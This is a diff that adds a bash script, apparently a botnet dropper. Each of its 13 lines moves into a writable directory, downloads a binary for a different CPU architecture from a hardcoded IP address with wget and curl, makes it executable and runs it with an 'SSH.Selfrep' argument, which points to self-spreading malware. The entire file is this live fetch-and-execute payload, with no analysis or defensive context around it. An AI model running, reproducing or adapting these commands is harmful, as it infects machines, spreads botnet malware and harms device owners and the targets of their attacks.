@@ -1,0 +1,14 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://3.93.174.87/lxonee/Zboubii.x86; curl -O http://3.93.174.87/lxonee/Zboubii.x86;cat Zboubii.x86 >x ;chmod +x *;./x SSH.Selfrep
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://3.93.174.87/lxonee/Zboubii.mips; curl -O http://3.93.174.87/lxonee/Zboubii.mips;cat Zboubii.mips >x ;chmod +x *;./x SSH.Selfrep
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://3.93.174.87/lxonee/Zboubii.mpsl; curl -O http://3.93.174.87/lxonee/Zboubii.mpsl;cat Zboubii.mpsl >x ;chmod +x *;./x SSH.Selfrep
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://3.93.174.87/lxonee/Zboubii.arm; curl -O http://3.93.174.87/lxonee/Zboubii.arm;cat Zboubii.arm >x ;chmod +x *;./x SSH.Selfrep
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://3.93.174.87/lxonee/Zboubii.arm5; curl -O http://3.93.174.87/lxonee/Zboubii.arm5;cat Zboubii.arm5 >x ;chmod +x *;./x SSH.Selfrep
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://3.93.174.87/lxonee/Zboubii.arm6; curl -O http://3.93.174.87/lxonee/Zboubii.arm6;cat Zboubii.arm6 >x ;chmod +x *;./x SSH.Selfrep
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://3.93.174.87/lxonee/Zboubii.arm7; curl -O http://3.93.174.87/lxonee/Zboubii.arm7;cat Zboubii.arm7 >x ;chmod +x *;./x SSH.Selfrep
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://3.93.174.87/lxonee/Zboubii.ppc; curl -O http://3.93.174.87/lxonee/Zboubii.ppc;cat Zboubii.ppc >x ;chmod +x *;./x SSH.Selfrep
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://3.93.174.87/lxonee/Zboubii.m68k; curl -O http://3.93.174.87/lxonee/Zboubii.m68k;cat Zboubii.m68k >x ;chmod +x *;./x SSH.Selfrep
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://3.93.174.87/lxonee/Zboubii.sh4; curl -O http://3.93.174.87/lxonee/Zboubii.sh4;cat Zboubii.sh4 >x ;chmod +x *;./x SSH.Selfrep
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://3.93.174.87/lxonee/Zboubii.spc; curl -O http://3.93.174.87/lxonee/Zboubii.spc;cat Zboubii.spc >x ;chmod +x *;./x SSH.Selfrep
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://3.93.174.87/lxonee/Zboubii.arc; curl -O http://3.93.174.87/lxonee/Zboubii.arc;cat Zboubii.arc >x ;chmod +x *;./x SSH.Selfrep
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://3.93.174.87/lxonee/Zboubii.x86_64; curl -O http://3.93.174.87/lxonee/Zboubii.x86_64;cat Zboubii.x86_64 >x ;chmod +x *;./x SSH.Selfrep
